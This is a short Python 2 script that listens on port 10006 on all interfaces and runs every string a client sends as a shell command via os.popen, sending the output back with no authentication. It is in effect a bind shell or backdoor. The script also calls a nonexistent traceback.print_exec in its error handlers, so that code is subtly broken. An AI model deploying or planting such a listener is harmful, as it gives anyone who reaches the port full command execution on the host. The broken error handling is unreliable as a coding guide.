#!/usr/bin/env python
#-*- coding:utf-8 -*-
host ='0.0.0.0'
port = 10006

import socket, traceback, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)

while 1:
    try:
        clientsock, clientaddr = s.accept()
    except KeyboardInterrupt:
        raise
    except:
        traceback.print_exec()
    try:
        print "got connection from ",clientsock.getpeername()
        while 1:
            data = clientsock.recv(4096)
            if not len(data):
                break
            result = os.popen(data).read() + 'end'
            print result

            clientsock.sendall(result)
    except (KeyboardInterrupt, SystemExit):
        raise
    except:
        traceback.print_exec()
    """
    try:
        clientsock.close()
    except KeyboardInterrupt:
        raise
    except:
        traceback.print_exec()
    """
